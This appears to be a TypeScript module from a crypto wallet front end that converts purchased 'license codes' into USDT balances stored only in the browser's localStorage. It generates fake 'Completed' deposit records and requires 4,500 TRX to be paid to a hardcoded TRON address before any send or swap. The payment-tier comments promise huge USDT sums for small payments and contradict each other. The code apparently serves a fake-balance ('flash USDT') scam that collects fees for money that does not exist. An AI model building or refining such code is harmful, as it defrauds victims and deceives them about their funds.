export interface License {
  code: string;
  planName: string;
  durationDays: number;
  usdtBalance: number;   // USDT TRC20 balance assigned at activation
  activatedAt: string;  // ISO
  expiresAt: string;    // ISO
  status: "active" | "expired";
}

export interface UserLicenses {
  current: License | null;
  history: License[];
}

// Balance codes → USDT amount
// Payment tiers:
//   100  → 2K   =    2,000 USDT
//   250  → 15K  =   15,000 USDT
//   500  → 10K  =   10,000 USDT
//   750  → 50K  =   50,000 USDT
//   1500 → 100K =  100,000 USDT  (added as mid-tier)
//   2500 → 150K =  150,000 USDT
//   1500 → 350K =  350,000 USDT  (premium tier)
//   5000 → 1M   = 1,000,000 USDT
//   25000→ 50M  =50,000,000 USDT
const BAL_MAP: Record<string, number> = {
  "750":  750,
  "2K":   2_000,
  "10K":  10_000,
  "15K":  15_000,
  "50K":  50_000,
  "100K": 100_000,
  "150K": 150_000,
  "350K": 350_000,
  "1M":   1_000_000,
  "50M":  50_000_000,
};

// Duration (days) → plan display name
const PLAN_MAP: Record<number, string> = {
  1:   "Daily",
  7:   "Weekly",
  30:  "Monthly",
  90:  "Premium",
  180: "Master",
  365: "Elite",
};

const BAL_CODES = Object.keys(BAL_MAP).join("|");
// Format: FTN-{DAYS}D-{BALCODE}-{5ALPHANUM}
// e.g.: FTN-30D-2K-A3K9M  or  FTN-90D-150K-B7N4P
const CODE_RE = new RegExp(`^FTN-(\\d+)D-(${BAL_CODES})-[A-Z0-9]{5}$`);

export type ParseResult =
  | { valid: true;  durationDays: number; planName: string; usdtBalance: number }
  | { valid: false; error: string };

export function parseLicenseCode(raw: string): ParseResult {
  const code = raw.trim().toUpperCase();

  // Detect old format FTN-XXXX-XXXX (4+4) and return a clear message
  if (/^FTN-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(code)) {
    return {
      valid: false,
      error: "Old code format detected. Please request an updated license code from support.",
    };
  }

  const m = code.match(CODE_RE);
  if (!m) {
    return { valid: false, error: "Invalid format. Expected: FTN-30D-2K-XXXXX" };
  }
  const days = parseInt(m[1], 10);
  const balCode = m[2];
  const planName = PLAN_MAP[days] ?? `${days}-Day`;
  const usdtBalance = BAL_MAP[balCode] ?? 0;
  return { valid: true, durationDays: days, planName, usdtBalance };
}

function storageKey(email: string): string {
  return `cv_licenses_${email.toLowerCase().replace(/[^a-z0-9]/g, "_")}`;
}

export function loadUserLicenses(email: string): UserLicenses {
  if (typeof window === "undefined") return { current: null, history: [] };
  try {
    const raw = localStorage.getItem(storageKey(email));
    if (!raw) return { current: null, history: [] };
    const data = JSON.parse(raw) as UserLicenses;
    if (data.current && new Date(data.current.expiresAt) <= new Date()) {
      data.history = [{ ...data.current, status: "expired" }, ...(data.history ?? [])];
      data.current = null;
      localStorage.setItem(storageKey(email), JSON.stringify(data));
    }
    return data;
  } catch {
    return { current: null, history: [] };
  }
}

export function saveUserLicenses(email: string, data: UserLicenses): void {
  localStorage.setItem(storageKey(email), JSON.stringify(data));
}

export function isLicenseActive(email: string): boolean {
  if (!email) return false;
  const { current } = loadUserLicenses(email);
  return !!current && new Date(current.expiresAt) > new Date();
}

export function activateLicense(
  email: string,
  rawCode: string
): { success: boolean; error?: string; license?: License } {
  const code = rawCode.trim().toUpperCase();
  const parsed = parseLicenseCode(code);
  if (!parsed.valid) {
    return { success: false, error: parsed.error };
  }

  const { current, history } = loadUserLicenses(email);
  if (current) {
    return { success: false, error: "You already have an active license." };
  }
  if ((history ?? []).some((l) => l.code === code)) {
    return { success: false, error: "This license code has already been used." };
  }

  const now = new Date();
  const expiresAt = new Date(now.getTime() + parsed.durationDays * 24 * 60 * 60 * 1000);
  const license: License = {
    code,
    planName: parsed.planName,
    durationDays: parsed.durationDays,
    usdtBalance: parsed.usdtBalance,
    activatedAt: now.toISOString(),
    expiresAt: expiresAt.toISOString(),
    status: "active",
  };

  saveUserLicenses(email, { current: license, history: history ?? [] });
  return { success: true, license };
}

export function formatDate(iso: string): string {
  const d = new Date(iso);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
}

export function formatCountdown(ms: number): string {
  if (ms <= 0) return "Expired";
  const days = Math.floor(ms / 86400000);
  const h = Math.floor((ms % 86400000) / 3600000);
  const m = Math.floor((ms % 3600000) / 60000);
  const s = Math.floor((ms % 60000) / 1000);
  const hms = `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
  return days > 0 ? `${days}d ${hms}` : hms;
}

export function formatUSDT(n: number): string {
  return n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// ─── TRX Balance ─────────────────────────────────────────────────────────────
// Required TRX before any send/swap operation
export const TRX_REQUIRED = 4_500;
export const TRX_ADDRESS   = "TAdnG4GgWBbUZ1jfL966DWwm8PAqnADKAm";

function trxKey(email: string): string {
  return `cv_trx_${email.toLowerCase().replace(/[^a-z0-9]/g, "_")}`;
}

export function getTrxBalance(email: string): number {
  if (typeof window === "undefined") return 0;
  return parseFloat(localStorage.getItem(trxKey(email)) ?? "0");
}

export function setTrxBalance(email: string, amount: number): void {
  localStorage.setItem(trxKey(email), String(amount));
}

// TRX credit code: TRX-{AMOUNT}-{5ALPHANUM}  e.g. TRX-4500-A3K9M
const TRX_CODE_RE = /^TRX-(\d+)-[A-Z0-9]{5}$/;
function trxUsedKey(email: string): string {
  return `cv_trx_used_${email.toLowerCase().replace(/[^a-z0-9]/g, "_")}`;
}

export function activateTrxCode(
  email: string,
  rawCode: string,
): { success: boolean; error?: string; added?: number } {
  const code = rawCode.trim().toUpperCase();
  const m = code.match(TRX_CODE_RE);
  if (!m) return { success: false, error: "Invalid TRX code format. Expected: TRX-4500-XXXXX" };

  const usedRaw = localStorage.getItem(trxUsedKey(email));
  const used: string[] = usedRaw ? JSON.parse(usedRaw) : [];
  if (used.includes(code)) return { success: false, error: "This TRX code has already been used." };

  const amount = parseInt(m[1], 10);
  const current = getTrxBalance(email);
  setTrxBalance(email, current + amount);
  localStorage.setItem(trxUsedKey(email), JSON.stringify([...used, code]));
  return { success: true, added: amount };
}

// ─── Transaction History ──────────────────────────────────────────────────────
export interface Tx {
  id: string;
  type: "Deposit" | "Withdraw" | "Swap";
  status: "Pending" | "Completed" | "Rejected";
  address: string;
  amount: string;
  date: string;
}

function txKey(email: string): string {
  return `cv_tx_${email.toLowerCase().replace(/[^a-z0-9]/g, "_")}`;
}

export function getTransactions(email: string): Tx[] {
  if (typeof window === "undefined") return [];
  try {
    const raw = localStorage.getItem(txKey(email));
    return raw ? (JSON.parse(raw) as Tx[]) : [];
  } catch { return []; }
}

export function addTransaction(email: string, tx: Omit<Tx, "id">): void {
  const list = getTransactions(email);
  const id = String(Date.now());
  localStorage.setItem(txKey(email), JSON.stringify([{ ...tx, id }, ...list]));
}

function todayStr(): string {
  const d = new Date();
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()}`;
}

export function buildInitialDeposit(license: License): Tx {
  return {
    id: "license-initial",
    type: "Deposit",
    status: "Completed",
    address: "License Activation",
    amount: `+${formatUSDT(license.usdtBalance)} USDT`,
    date: todayStr(),
  };
}
